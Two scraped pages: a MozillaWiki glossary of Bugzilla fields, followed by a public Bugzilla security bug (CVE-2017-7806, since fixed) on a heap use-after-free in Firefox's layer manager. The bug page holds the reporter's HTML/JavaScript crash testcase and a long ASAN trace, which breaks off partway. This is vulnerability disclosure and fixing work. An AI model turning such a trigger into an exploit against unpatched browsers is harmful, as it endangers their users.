=== Content from wiki.mozilla.org_3659d679_20250126_113745.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_c8ba3d85_20250125_200847.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1378113)
* [XML](/show_bug.cgi?ctype=xml&id=1378113)

Closed
[Bug 1378113](/show_bug.cgi?id=1378113)
(CVE-2017-7806)

Opened 8 years ago
Closed 8 years ago

# heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite

## Categories

### (Core :: Graphics: Layers, defect, P3)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Graphics%3A%20Layers#Graphics%3A%20Layers)

Graphics: Layers
▾

Core :: Graphics: Layers
The graphics subsystem that implements hardware-accelerated (and software) composition of layers of content.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Layers&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Layers&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Graphics%3A%20Layers)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

54 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P3

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla56

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| a11y-review | --- |
| Webcompat Priority | --- |
| Webcompat Score | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr52 | --- | [unaffected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=unaffected) |
| firefox54 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=wontfix) |
| firefox55 | [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed) |
| firefox56 | [+](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr52 |  | unaffected |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox54 |  | wontfix |
| firefox55 | + | fixed |
| firefox56 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: nils, Assigned: nical)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/33545d2334463711ea5db843306e04ab?d=mm&size=40)  [nical](/user_profile?user_id=438998)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=40)  [nils](/user_profile?user_id=344130)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/17436ade8da1b23d42b3df05b9c4fc77?d=mm&size=40)  [bhood](/user_profile?user_id=697075)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

15 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1382636](/show_bug.cgi?id=1382636 "RESOLVED DUPLICATE - Intermittent AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (5 keywords, Whiteboard: [gfx-noted][adv-main55+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7806

[Keywords:](/describekeywords.cgi)

[crash](/buglist.cgi?keywords=crash&resolution=---),
[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[gfx-noted][adv-main55+][post-critsmash-triage]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a2350457_1689 "8 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | [qe-verify](#a2380700_452604 "7 years ago") | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | qe-verify | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files)

| [05crab.svg (required for the testcase)](/attachment.cgi?id=8883281)  [8 years ago](#c0)  [Nils](/user_profile?user_id=344130)   327.50 KB, image/svg+xml |  | [Details](/attachment.cgi?id=8883281&action=edit) |
| --- | --- | --- |
| [crash.html (testcase, crashes firefox)](/attachment.cgi?id=8883282)  [8 years ago](#c1)  [Nils](/user_profile?user_id=344130)   412 bytes, text/html |  | [Details](/attachment.cgi?id=8883282&action=edit) |
| [ASAN output](/attachment.cgi?id=8883283)  [8 years ago](#c2)  [Nils](/user_profile?user_id=344130)   18.51 KB, text/plain |  | [Details](/attachment.cgi?id=8883283&action=edit) |
| [Make sure the layer manager stays alive until the end of the method call.](/attachment.cgi?id=8887062)  [8 years ago](#c8)  [Nicolas Silva [:nical]](/user_profile?user_id=438998)   2.50 KB, patch | dvander : [review+](#a1141545_309316 "8 years ago")  jcristau : [approval-mozilla-beta+](#c15 "8 years ago")  abillings : [sec-approval+](#c10 "8 years ago") | [Details](/attachment.cgi?id=8887062&action=edit) | [Diff](/attachment.cgi?id=8887062&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1378113#c0)• 8 years ago |
|  | |

Attached image
[05crab.svg (required for the testcase)](attachment.cgi?id=8883281)
— [Details](attachment.cgi?id=8883281&action=edit)

The following testcase crashes the latest ASAN build of Firefox (BuildID=20170703081455). It requires the attached 05crab.svg file in the same directory. Attempts to minimise the file were unsuccessful and made the testcase far less reliable.
<script>
function start() {
o1=window.open('05crab.svg','popup41','width=-11,left=7,innerWidth=2621447,resizable');
window.open('data:text/html,<div>','popup31','left=-2,menubar,toolbar');
o1.onresize=fun0;
o1.resizeTo(-26618,2);
o1.close();
}
function fun0() {
x=new XMLHttpRequest();
x.open("POST","<https://mozilla.org>",false);
try{x.send("test");}catch(e){}
}
</script>
<body onload="start()"></body>
ASAN report:
=================================================================
==27239==ERROR: AddressSanitizer: heap-use-after-free on address 0x6140001bb1d8 at pc 0x7f6be0f281b6 bp 0x7ffe4ec3af90 sp 0x7ffe4ec3af88
READ of size 8 at 0x6140001bb1d8 thread T0 (Web Content)
#0 0x7f6be0f281b5 in Length /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37
#1 0x7f6be0f281b5 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:520
#2 0x7f6be1018c45 in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:525:14
#3 0x7f6be0288415 in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1443:20
#4 0x7f6bdfb4253e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25
#5 0x7f6bdfb3f354 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17
#6 0x7f6bdfb40fa4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5
#7 0x7f6bdfb41588 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15
#8 0x7f6bded391af in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:367:25
#9 0x7f6bded65f48 in nsThread::ProcessNextEvent(bool, bool\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1422:14
#10 0x7f6bded6c098 in NS\_ProcessNextEvent(nsIThread\*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10
#11 0x7f6bdfb4a1f1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate\*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21
#12 0x7f6bdfaa6be0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:320:10
#13 0x7f6bdfaa6be0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:313
#14 0x7f6bdfaa6be0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:293
#15 0x7f6be514ca6f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27
#16 0x7f6be937fa47 in XRE\_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22
#17 0x7f6bdfaa6be0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:320:10
#18 0x7f6bdfaa6be0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:313
#19 0x7f6bdfaa6be0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:293
#20 0x7f6be937f4ad in XRE\_InitChildProcess(int, char\*\*, XREChildData const\*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34
#21 0x4eb813 in content\_process\_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30
#22 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286
#23 0x7f6bfbf4c82f in \_\_libc\_start\_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291
#24 0x41d168 in \_start (/home/nils/fuzzer3/firefox/firefox+0x41d168)
0x6140001bb1d8 is located 408 bytes inside of 424-byte region [0x6140001bb040,0x6140001bb1e8)
freed by thread T0 (Web Content) here:
#0 0x4bb69b in \_\_interceptor\_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_malloc\_linux.cc:47:3
#1 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/Layers.h:180:3
#2 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40
#3 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395
#4 0x7f6be5124384 in assign\_assuming\_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65
#5 0x7f6be5124384 in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:166
#6 0x7f6be5124384 in mozilla::widget::PuppetWidget::Destroy() /home/worker/workspace/build/src/widget/PuppetWidget.cpp:198
#7 0x7f6be49ff837 in mozilla::dom::TabChild::DestroyWindow() /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1030:24
#8 0x7f6be4a118c4 in mozilla::dom::TabChild::RecvDestroy() /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:2361:3
#9 0x7f6be018e9ae in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBrowserChild.cpp:4248:20
#10 0x7f6be02fb19c in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:5288:28
#11 0x7f6bdfb4253e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25
#12 0x7f6bdfb3f354 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17
#13 0x7f6bdfb40fa4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5
#14 0x7f6bdfb41588 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15
#15 0x7f6bded391af in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:367:25
#16 0x7f6bded65f48 in nsThread::ProcessNextEvent(bool, bool\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1422:14
#17 0x7f6bded6c098 in NS\_ProcessNextEvent(nsIThread\*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10
#18 0x7f6be4fadc95 in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3088:31)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:323:25
#19 0x7f6be4fadc95 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::BodyExtractorBase const\*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3088
#20 0x7f6be4fcb846 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext\*, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:379:13
#21 0x7f6be2be4156 in mozilla::dom::XMLHttpRequestBinding::send(JSContext\*, JS::Handle<JSObject\*>, mozilla::dom::XMLHttpRequest\*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:783:13
#22 0x7f6be3348b1e in mozilla::dom::GenericBindingMethod(JSContext\*, unsigned int, JS::Value\*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3028:13
#23 0x7f6be9845724 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15
#24 0x7f6be9845724 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470
#25 0x7f6be982e54b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12
#26 0x7f6be982e54b in Interpret(JSContext\*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060
#27 0x7f6be98152c8 in js::RunScript(JSContext\*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12
#28 0x7f6be98458bc in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15
#29 0x7f6be9846212 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10
#30 0x7f6bea49624e in js::Wrapper::call(JSContext\*, JS::Handle<JSObject\*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:169:12
#31 0x7f6bea45a629 in js::CrossCompartmentWrapper::call(JSContext\*, JS::Handle<JSObject\*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:359:23
#32 0x7f6bea4763d3 in js::Proxy::call(JSContext\*, JS::Handle<JSObject\*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:481:21
#33 0x7f6bea478da7 in js::proxy\_Call(JSContext\*, unsigned int, JS::Value\*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:741:12
#34 0x7f6be9845b6c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15
#35 0x7f6be9845b6c in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:452
#36 0x7f6be9846212 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10
#37 0x7f6bea1bce1b in JS::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12
#38 0x7f6be2dae555 in mozilla::dom::EventHandlerNonNull::Call(JSContext\*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37
previously allocated by thread T0 (Web Content) here:
